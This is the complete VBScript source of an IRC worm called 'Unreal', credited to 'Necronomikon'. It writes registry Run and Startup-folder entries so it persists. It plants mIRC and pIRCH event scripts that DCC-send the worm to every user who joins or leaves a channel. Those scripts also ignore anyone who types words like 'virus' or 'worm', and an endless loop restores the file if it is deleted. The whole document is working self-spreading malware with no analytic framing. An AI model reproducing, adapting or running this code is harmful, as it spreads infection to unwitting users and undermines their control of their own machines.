'VBS.mIRC32.pIRCH32/98.Unreal
'Coded by Necronomikon
On Error Resume Next
Dim unreal, WormFile1, WormFile2, FSO, fuckup
Set FSO = CreateObject("Scripting.FileSystemObject")
unreal = Wscript.ScriptFullName
Set ws = CreateObject("WScript.Shell")
ws.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm", "wscript.exe c:\windows\unreal.vbs %"
Set WormFile1 = FSO.CreateTextFile("c:\windows\system\sys1.dll", True)
WormFile1.WriteLine "[Levels]"
WormFile1.WriteLine "Enabled=1"
WormFile1.WriteLine "Count=6"
WormFile1.WriteLine "Level1=000-Unknowns"
WormFile1.WriteLine "000-UnknownsEnabled=1"
WormFile1.WriteLine "Level2=100-Level 100"
WormFile1.WriteLine "100-Level 100Enabled=1"
WormFile1.WriteLine "Level3=200-Level 200"
WormFile1.WriteLine "200-Level 200Enabled=1"
WormFile1.WriteLine "Level4=300-Level 300"
WormFile1.WriteLine "300-Level 300Enabled=1"
WormFile1.WriteLine "Level5=400-Level 400"
WormFile1.WriteLine "400-Level 400Enabled=1"
WormFile1.WriteLine "Level6=500-Level 500"
WormFile1.WriteLine "500-Level 500Enabled=1"
WormFile1.WriteLine ""
WormFile1.WriteLine "[000-Unknowns]"
WormFile1.WriteLine "User1=*!*@*"
WormFile1.WriteLine "UserCount=1"
WormFile1.WriteLine "Event1=; pIRCH98.Unreal"
WormFile1.WriteLine "Event2=on 1:JOIN:#:{"
WormFile1.WriteLine "Event3=  if ( $nick != $me ) {"
WormFile1.WriteLine "Event4=    /dcc send $nick c:\windows\system\system.vbs"
WormFile1.WriteLine "Event5=  }"
WormFile1.WriteLine "Event6=  if ( $me ison #nohack ) {"
WormFile1.WriteLine "Event7=    /quit"
WormFile1.WriteLine "Event8=  }"
WormFile1.WriteLine "Event9=}"
WormFile1.WriteLine "Event10=on 1:PART:#:/dcc send $nick c:\windows\system\system.vbs"
WormFile1.WriteLine "Event11=version:/notice $nick \-1 pIRCH98: Infected with Unreal!!! \-1:-"
WormFile1.WriteLine "Event12=on TEXT:virus:#:/ignore # $nick"
WormFile1.WriteLine "Event13=on TEXT:trojan:#:/ignore # $nick"
WormFile1.WriteLine "Event14=on TEXT:worm:#:/ignore # $nick"
WormFile1.WriteLine "Event15=on TEXT:unreal:#:/ignore # $nick"
WormFile1.WriteLine "Event16=on TEXT:toofunny:#:/ignore # $nick"
WormFile1.WriteLine "Event17=on TEXT:bye:#:/quit"
WormFile1.WriteLine "Event18=on KICKED:*:#: /msg $nick FUCK YOU!!!"
WormFile1.WriteLine "EventCount=18"
WormFile1.WriteLine "[100-Level 100]"
WormFile1.WriteLine "UserCount=0"
WormFile1.WriteLine "EventCount=0"
WormFile1.WriteLine ""
WormFile1.WriteLine "[200-Level 200]"
WormFile1.WriteLine "UserCount=0"
WormFile1.WriteLine "EventCount=0"
WormFile1.WriteLine ""
WormFile1.WriteLine "[300-Level 300]"
WormFile1.WriteLine "UserCount=0"
WormFile1.WriteLine "EventCount=0"
WormFile1.WriteLine ""
WormFile1.WriteLine "[400-Level 400]"
WormFile1.WriteLine "UserCount=0"
WormFile1.WriteLine "EventCount=0"
WormFile1.WriteLine ""
WormFile1.WriteLine "[500-Level 500]"
WormFile1.WriteLine "UserCount=0"
WormFile1.WriteLine "EventCount=0"
WormFile1.Close
Set WormFile2 = FSO.CreateTextFile("c:\windows\system\sys2.dll", True)
WormFile2.WriteLine "[script]"
WormFile2.WriteLine "n0=; pIRCH98.unreal"
WormFile2.WriteLine "n1=on 1:JOIN:#:{"
WormFile2.WriteLine "n2=  if ( $nick != $me ) {"
WormFile2.WriteLine "n3=    /dcc send $nick c:\windows\system\system.vbs"
WormFile2.WriteLine "n4=  }"
WormFile2.WriteLine "n5=  if ( $me ison #nohack ) {"
WormFile2.WriteLine "n6=    /quit"
WormFile2.WriteLine "n7=  }"
WormFile2.WriteLine "n8=}"
WormFile2.WriteLine "n9=on 1:PART:#:/dcc send $nick c:\windows\system\system.vbs"
WormFile2.WriteLine "n10=version:/notice $nick \-1 mIRC: Infected with Unreal!!! \-1:-"
WormFile2.WriteLine "n11=on TEXT:virus:#:/ignore # $nick"
WormFile2.WriteLine "n12=on TEXT:trojan:#:/ignore # $nick"
WormFile2.WriteLine "n13=on TEXT:worm:#:/ignore # $nick"
WormFile2.WriteLine "n14=on TEXT:unreal:#:/ignore # $nick"
WormFile2.WriteLine "n15=on TEXT:system:#:/ignore # $nick"
WormFile2.WriteLine "n16=on TEXT:bye:#:/quit"
WormFile2.WriteLine "n17=on KICKED:*:#: /msg $nick FUCK YOU!!!"
WormFile2.Close
FSO.CopyFile "c:\windows\system\sys1.dll", "c:\pirch98\events.ini"
FSO.CopyFile "c:\windows\system\sys1.dll", "c:\pirch32\events.ini"
FSO.CopyFile "c:\windows\system\sys2.dll", "c:\mirc\script.ini"
FSO.CopyFile Unreal, "c:\windows\system\system.vbs"
FSO.CopyFile Unreal, "c:\windows\start menu\programs\startUp\system.vbs"
If Month(Now()) = 12 And Day(Now()) = 14 Then MsgBox "Happy Birthday Necronomikon", 4096 , "Birthday Greeting!!!"
End If
'Antideletion function by [K]Alamar
Function fuckup()
Set fso = CreateObject("scripting.filesystemobject")
Set fuck = fso.opentextfile(wscript.scriptfullname, 1)
vir = fuck.readall
fuck.Close
Do
If Not (fso.fileexists(wscript.scriptfullname)) Then
Set fuck = fso.createtextfile(wscript.scriptfullname, True)
fuck.write vir
fuck.Close
End If
Loop
End Function
